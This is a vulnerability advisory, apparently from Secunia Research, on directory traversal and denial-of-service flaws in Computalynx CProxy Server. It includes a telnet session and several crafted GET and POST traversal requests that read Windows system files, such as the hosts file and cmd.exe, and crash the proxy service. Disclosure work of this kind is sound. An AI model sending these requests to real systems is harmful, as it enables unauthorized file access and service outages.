AFFECTED PRODUCTS

Affected Software:

  - Computalynx CProxy 3.3.x for Win32
  - Computalynx CProxy 3.4.x (3.4.4 inclusive) for Win32

Possibly other software versions are affected.

IDENTIFIED ISSUES

The following issues were found to affect the aforementioned Computalynx
CProxy Server software:

  [[1]](#1) Directory Traversal and Arbitrary File Access Attack
  [[2]](#2) Denial-of-Service Attack

BRIEF DESCRIPTION

Computalynx CProxy is a Windows platform based proxy server featuring
HTTP, Telnet, POP3, SMTP,
FTP proxy functions, as well as Anti Virus and Content Filtering
capabilities.       Because of
inadequate input validation, a malicious attacker can perform a
directory traversal attack  and
thus gain access to arbitrary files located on the CProxy Server
system.    Moreover, using the
same attack vector with especially crafted HTTP requests,    it is
possible to crash the CProxy
service running on the remote system.

DETAILED DESCRIPTION

Computalynx CProxy Server is a multifunctional Windows platform based
proxy server with  multi-
protocol support.   When performing proxy functions, CProxy Server is
vulnerable to a directory
traversal attack.   Inadequate input validation and input filtering
allows a remote attacker to
gain attack to arbitrary files on the Windows system upon which the
CProxy Server software  has
been deployed.     This first issue of directory traversal lies within
the fact that the CProxy
Server fails to filter out double dot attacks and in turn  fails  to
protect  arbitrary  files
from being requested and opened using the proxy service.       An
especially crafted URL allows
allows arbitrary files to be recovered from the system.       The
retrieval of system files can
compromise the entire system or expose the system to further avenues of
attack.     A malicious
attacker can perform a request using the following format to gain access
to arbitrary data:

GET http://<path-to-target-directory>/<filename> HTTP/1.0<CRLF><CRLF>

An attacker can gain access to a file in the WINNT directory as shown in
the following example,
by connecting to CProxy Server's proxy service (listening on TCP port
8080 by default),     and
executing the following request:

   ronin[kris] ~ $ telnet 10.0.0.1 8080
   Trying 10.0.0.1...
   Connected to 10.0.0.1.
   Escape character is '^]'.
   GET http://../../../../../winnt/system32/drivers/etc/hosts HTTP/1.0
                                                                                      \

   HTTP/1.0 200 OK
   Content-length: 734
   Date: Sat, 19 Feb 2005 21:09:58 GMT
   Date: Sat, 19 Feb 2005 21:09:58 GMT
   # Copyright (c) 1993-1999 Microsoft Corp.
   #
   # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
   #
   # This file contains the mappings of IP addresses to host names. Each
   # entry should be kept on an individual line. The IP address should
   # be placed in the first column followed by the corresponding host name.
   # The IP address and the host name should be separated by at least one
   # space.
   #
   # Additionally, comments (such as these) may be inserted on individual
   # lines or following the machine name denoted by a '#' symbol.
   #
   # For example:
   #
   #      102.54.94.97     rhino.acme.com          # source server
   #       38.25.63.10     x.acme.com              # x client host
                                                                                      \

   127.0.0.1       localhost
   Connection closed by foreign host.

In conjunction with this method, other HTTP methods such as "POST" and
"HEAD", will also lead to
arbitrary file retrieval.

When retrieving an arbitrary ASCII file using the "GET" method,  causes
the file to be displayed
and immediately afterwards causes the CProxy Server  service  to  crash
with an  error  message
indicating that "memory could not be read".  However, when retrieving
this same ASCII file using
the "POST" or "HEAD" methods will cause the file contents to be
displayed and does not crash the
CProxy Server service,       allowing an attacker to execute multiple
requests and thus allowing
various arbitrary  files to be retrieved from the CProxy Server system.

  * The following request will cause the arbitrary file to be displayed:

    -> "POST http://../../../../../winnt/system32/drivers/etc/hosts
HTTP/1.0"

  * The following request will cause the arbitrary file to be displayed
and the CProxy Server
    service to crash:

    -> "GET http://../../../../../winnt/system32/drivers/etc/hosts HTTP/1.0"

When attempting to retrieve an executable file using any of these HTTP
methods ("GET","HEAD", or
"POST"), in the aforementioned manner,   will cause the contents of the
executable file contents
to be displayed and the CProxy Server service to crash with an error
message that "memory  could
not be read", rendering the service unavailable, thus resulting in a
Denial-of-Service condition.

  * Both of the following requests will cause the arbitrary executable's
contents to be displayed
    and the CProxy Server service to crash:

    -> "GET http://../../../../../winnt/system32/cmd.exe"
    -> "POST http://../../../../../winnt/system32/cmd.exe"

CHARACTERISTICS

* Inadequate input validation and filtering allows an attacker to
perform directory traversal
  attacks against the systems running Computalynx CProxy Server.

* Different vectors of attack allow retrieval of arbitrary and possibly
sensitive files from
  the system running Computalynx CProxy Server.

* Use of especially crafted URL's allow attackers to render to service
unavailable, causing a
  Denial-of-Service condition.

SEVERITY

Each of these two issues affecting Computalynx CProxy Server software
can directly or indirectly
allow partial or complete compromise of the system and/or the data
stored on the system running
the CProxy Server software.

Moreover,        the second issue regarding a Denial-of-Service attack
against the CProxy Server
software will directly affect any users depending on the availability of
the functions which the
CProxy Software performs on this system.

Classification: MEDIUM to HIGH

VENDOR STATUS

19/Feb/2005 - Computalynx contacted regarding this issue.
02/Mar/2005 - At present, the vendor has not replied regarding this issue.

SOLUTION

* Currently awaiting vendor status for a solution regarding this issue.

* A mitigation strategy against attacks of this nature would be to
ensure that remote connections
  to the CProxy Server are not authorised (i.e. through the use of
proper firewall rules).

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
